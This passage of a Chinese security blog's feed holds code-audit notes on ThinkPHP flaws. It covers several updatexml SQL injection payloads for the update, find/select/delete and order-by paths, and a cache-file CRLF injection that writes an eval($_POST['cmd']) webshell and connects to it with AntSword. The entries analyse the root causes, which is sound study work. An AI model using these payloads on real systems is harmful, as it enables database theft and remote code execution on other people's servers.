      <category term="Notes" scheme="http://h3art3ars.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>think3.2.3 sql注入</title>
    <link href="http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2019-12-23T04:16:44.000Z</published>
    <updated>2019-12-23T04:21:41.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="update注入-lt-3-2-3"><a href="#update注入-lt-3-2-3" class="headerlink" title="update注入(&lt;=3.2.3)"></a>update注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例"><a href="#漏洞代码实例" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$User&#x3D;M(&#39;user&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$user[&#39;id&#39;]&#x3D;I(&#39;id&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$data[&#39;name&#39;]&#x3D;I(&#39;name&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$data[&#39;money&#39;]&#x3D;I(&#39;money&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;$User-&gt;where($user)-&gt;save($data);</span></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;&#39;0&#39;,&#96;user&#96;&#x3D;&#39;&#39; WHERE &#96;id&#96; &#x3D; &#39;&#39; and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">save($data,$options)-&gt;_parseOptions($Options)-&gt;update($data,$options)-&gt;parsewhere($option[$where])-&gt;parsewhereitem($key,$value)</span></pre></td></tr></table></figure><ul><li><p>$Options参数为空，但经过_parseOptions($Options)方法将参数中的id[]数组变为$where</p></li><li><p>进入parsewhereitem()方法将id分为键值 如果id[0]==bind，则将id[1]拼接到</p></li><li><p>如果id[0]==bind，则将id[1]拼接到 <code>$whereStr .= $key.&#39; = :&#39;.$val[1];</code></p></li><li><p><code>:n</code>表示更新的数组 <code>data[n]</code>,可以结合sql语句闭合一下，有时不闭合也可以造成注入</p></li><li><p>前面的exp变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)&amp;user&#x3D;admin&amp;money&#x3D;11</span></pre></td></tr></table></figure><p>则语句则变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;11,&#96;user&#96;&#x3D;&#39;admin&#39; WHERE &#96;id&#96; &#x3D; 11 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;id&#x3D;:1 and updat.... </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;而 :1&#x3D;data[1]&#x3D;money&#x3D;11</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>经过<code>_parseOptions($Options)</code>方法将可控变量合并到<code>$Options</code>参数中</p><h2 id="find-select-delete注入-lt-3-2-3"><a href="#find-select-delete注入-lt-3-2-3" class="headerlink" title="find_select_delete注入(&lt;=3.2.3)"></a>find_select_delete注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例-1"><a href="#漏洞代码实例-1" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;find(I(&#39;id&#39;));      &#x2F;&#x2F;select * from user where id &#x3D;1;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;select(I(&#39;id&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;delete(I(&#39;id&#39;));</span></pre></td></tr></table></figure></li></ul><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  delete 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  select 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  find 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  Add 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  addAll 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">save 方法 第二个参数可外部控制时可注入</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?id[table]&#x3D;user%20where%20id&#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id &#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;id%3d3%20and%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[delete]DELETE FROM &#96;tp_member&#96; WHERE id&#x3D;3 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><p>除了where 还可以利用其他方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">where,table,field,join,group,having....</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;根据parseSql函数动态调试</span></pre></td></tr></table></figure><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>_parseOptions()</code>方法执行了数组合并操作，将可控 <code>options</code>参数拼接到即将执行的sql语句参数中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_array($options))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    $options &#x3D;  array_merge($this-&gt;options,$options);</span></pre></td></tr></table></figure><h3 id="漏洞流程（find）"><a href="#漏洞流程（find）" class="headerlink" title="漏洞流程（find）"></a>漏洞流程（find）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">find($options&#x3D;array())-&gt;select($options&#x3D;array())-&gt;buildSelectSql($options)-&gt;parseSql($sql,$options&#x3D;array());</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;parseSql()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;$sql&#x3D;SELECT%DISTINCT% %FIELD% FROM &#x2F;&#x2F;%TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">public function parseSql($sql,$options&#x3D;array())&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        $sql   &#x3D; str_replace(          array(&#39;%TABLE%&#39;,&#39;%DISTINCT%&#39;,&#39;%FIELD%&#39;,&#39;%JOIN%&#39;,&#39;%WHERE%&#39;,&#39;%GROUP%&#39;,&#39;%HAVING%&#39;,&#39;%ORDER%&#39;,&#39;%LIMIT%&#39;,&#39;%UNION%&#39;,&#39;%LOCK%&#39;,&#39;%COMMENT%&#39;,&#39;%FORCE%&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            array(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseTable($options[&#39;table&#39;]),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseDistinct(isset($options[&#39;distinct&#39;])?$options[&#39;distinct&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseField(!empty($options[&#39;field&#39;])?$options[&#39;field&#39;]:&#39;*&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseJoin(!empty($options[&#39;join&#39;])?$options[&#39;join&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseWhere(!empty($options[&#39;where&#39;])?$options[&#39;where&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseGroup(!empty($options[&#39;group&#39;])?$options[&#39;group&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseHaving(!empty($options[&#39;having&#39;])?$options[&#39;having&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseOrder(!empty($options[&#39;order&#39;])?$options[&#39;order&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLimit(!empty($options[&#39;limit&#39;])?$options[&#39;limit&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseUnion(!empty($options[&#39;union&#39;])?$options[&#39;union&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLock(isset($options[&#39;lock&#39;])?$options[&#39;lock&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseComment(!empty($options[&#39;comment&#39;])?$options[&#39;comment&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseForce(!empty($options[&#39;force&#39;])?$options[&#39;force&#39;]:&#39;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            ),$sql);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        return $sql;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>将可控的options[‘where’]参数拼接到sql语句中</p><p>也可以使用其他的options值拼接，例如options[‘table’]</p><p><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener"> thinkphp3.2_find_select_delete注入 </a></p><h2 id="ord-by-注入-lt-3-2-3-amp-lt-5-1-22"><a href="#ord-by-注入-lt-3-2-3-amp-lt-5-1-22" class="headerlink" title="ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)"></a>ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)</h2><h3 id="漏洞代码实例-2"><a href="#漏洞代码实例-2" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$data&#x3D;array();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;user&#39;]&#x3D;array(&#39;eq&#39;,&#39;admin&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$order&#x3D;I(&#39;get.order&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">ar_dump($res);</span></pre></td></tr></table></figure><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?order[updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23]&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;直接用order&#x3D;updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23也行 亲测</span></pre></td></tr></table></figure><p>执行的sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;user&#96; WHERE &#96;user&#96; &#x3D; &#39;admin&#39; ORDER BY updatexml(1,concat(0x3a,(select user()),0x5d),1)# 1 LIMIT 1</span></pre></td></tr></table></figure><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p> ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入。</p>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3 sql注入漏洞总结
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="sql注入" scheme="http://h3art3ars.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2019/11 Person Notes</title>
    <link href="http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/"/>
    <id>http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/</id>
    <published>2019-12-17T02:43:59.000Z</published>
    <updated>2019-12-17T02:45:20.657Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">没什么好看的垃圾个人笔记</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d59de06ad25b9edcaa18ec538ddf3fe2215c839654af56f34deec268dbacfe0c"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      个人笔记
    
    </summary>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/categories/Notes/"/>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp3.2.3-5.0.10缓存漏洞</title>
    <link href="http://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
    <id>http://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-12-16T11:04:10.000Z</published>
    <updated>2019-12-17T03:27:11.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpthink3-2-3-5-0-10缓存函数缺陷"><a href="#phpthink3-2-3-5-0-10缓存函数缺陷" class="headerlink" title="phpthink3.2.3-5.0.10缓存函数缺陷"></a>phpthink3.2.3-5.0.10缓存函数缺陷</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="thinkphp3-2-3"><a href="#thinkphp3-2-3" class="headerlink" title="thinkphp3.2.3"></a>thinkphp3.2.3</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/index.php/Home/Index/get?id=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件为缓存名的md5值，这里采用md5（name）=b068931cc450442b63f5b3d276ea4297</p><p><code>http://domain/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>之后蚁剑连接。</p></li></ol><h3 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/public/index.php/Home/Index/index</code></p><p>POST数据 :<code>con=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件位置b0文件夹是md5(cache-name)前2位。</p><p><code>http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>蚁剑连接</p></li></ol><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><ul><li>使用<code>S()</code>函数或者<code>Cache()</code>函数的位置不确定，尽量拿源码分析。</li><li>使用缓存函数的<code>name</code>变量未知，拿源码分析或尝试常用的缓存名<code>name</code>、<code>key</code></li></ul><h2 id="3-2-3漏洞复现"><a href="#3-2-3漏洞复现" class="headerlink" title="3.2.3漏洞复现"></a>3.2.3漏洞复现</h2><ul><li><p>直接跟进到<code>/Library/Think/Cache/File.class.php</code>文件，看到set方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;**</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">     * 写入缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">     * @access public</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">     * @param string $name 缓存变量名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">     * @param mixed $value  存储数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">     * @param int $expire  有效时间 0为永久</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">     * @return boolean</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">     *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    public function set($name,$value,$expire&#x3D;null) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        N(&#39;cache_write&#39;,1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        if(is_null($expire)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">            $expire &#x3D;  $this-&gt;options[&#39;expire&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        $filename   &#x3D;   $this-&gt;filename($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        $data   &#x3D;   serialize($value);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        if( C(&#39;DATA_CACHE_COMPRESS&#39;) &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F;数据压缩</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            $data   &#x3D;   gzcompress($data,3);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        if(C(&#39;DATA_CACHE_CHECK&#39;)) &#123;&#x2F;&#x2F;开启数据校验</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  md5($data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  &#39;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        $data    &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F;data参数经过序列化，直接被写到文件内。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        $result  &#x3D;   file_put_contents($filename,$data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        if($result) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            if($this-&gt;options[&#39;length&#39;]&gt;0) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">                &#x2F;&#x2F; 记录缓存队列</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;queue($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">            clearstatcache();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">            return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">            return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>写一个调用缓存函数的的方法，运行一下。看看写进去什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">namespace Home\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">use Think\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">class IndexController extends Controller &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    public function index()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $a&#x3D;I(&#39;post.a3&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        S(&#39;name&#39;,$a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><p>在set方法下断点，访问 <code>http://localhost/index.php/Home/Index/index.html</code> ，post数据：<code>a3=aaaa</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-1.png" alt="debug"></p><p>可以看到$data参数经过序列化，直接写入php后缀的文件。F9运行可以看到，在<code>Application/Runtime/Temp/</code>文件夹下生成了php文件。</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-2.png" alt="cachefile"></p><p>写入到文件被行注释了。</p></li><li><p><code>$data</code>参数未过滤<code>%0d%0a</code>可以用换行来绕过行注释，尝试post数据：</p><p><code>a3=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-3.png" alt="file-cache"></p></li><li><p>之后用蚁剑连接成功</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-4.png" alt="antsword"></p></li></ul><h2 id="5-0-5漏洞复现"><a href="#5-0-5漏洞复现" class="headerlink" title="5.0.5漏洞复现"></a>5.0.5漏洞复现</h2><ul><li><p>漏洞代码与3.2.3差不多，不一样的在缓存目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $name &#x3D; md5($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 使用子目录</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; substr($name, 0, 2) . 